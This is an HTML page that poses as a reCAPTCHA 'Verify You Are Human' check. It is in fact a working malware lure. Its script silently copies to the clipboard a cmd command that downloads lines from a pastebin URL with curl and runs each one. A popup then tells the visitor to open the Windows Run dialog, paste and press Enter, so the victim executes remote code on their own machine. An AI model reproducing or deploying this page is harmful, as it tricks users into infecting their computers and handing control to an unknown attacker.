<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Human Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        #verification-container {
            background-color: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            z-index: 1;
        }

        #verification-container h1 {
            color: #3578e5;
        }

        #verification-popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            z-index: 2;
        }

        #popup-content {
            background-color: white;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            width: 300px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }

        #popup-content h2 {
            color: black;
        }

        button {
            background-color: #3578e5;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        button img {
            margin-right: 10px;
        }

        button:hover {
            background-color: #2e68c4;
        }

        ol {
            text-align: left;
        }

        li {
            margin-bottom: 10px;
        }

        #windows-logo {
            width: 14px;
            vertical-align: middle;
        }
    </style>
</head>
<body>

    <div id="verification-container">
        <h1>Verify You Are Human</h1>
        <p>Please verify that you are a human to continue.</p>
        <button id="verify-button">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaLogo.svg" alt="reCAPTCHA" width="20px" height="20px">
            I'm not a robot
        </button>
    </div>

    <div id="verification-popup">
        <div id="popup-content">
            <h2>Verification Steps</h2>
            <ol>
                <li>
                    Press Windows Button "<img src="https://freepngimg.com/save/173208-windows-logo-free-hd-image/1021x1024" alt="Windows Logo" id="windows-logo">" + R
                </li>
                <li>Press CTRL + V</li>
                <li>Press Enter</li>
            </ol>
        </div>
    </div>

    <script>
        document.getElementById("verify-button").addEventListener("click", function() {
            document.getElementById("verification-popup").style.display = "flex";
            navigator.clipboard.writeText('cmd /c "@for /f "delims=" %i in (\'curl -s "https://pastebin.com/raw/S4Z7UjzW"\') do @cmd /c %i"');
        });

        document.getElementById("verification-popup").addEventListener("click", function() {
            document.getElementById("verification-popup").style.display = "none";
        });
    </script>

</body>
</html>
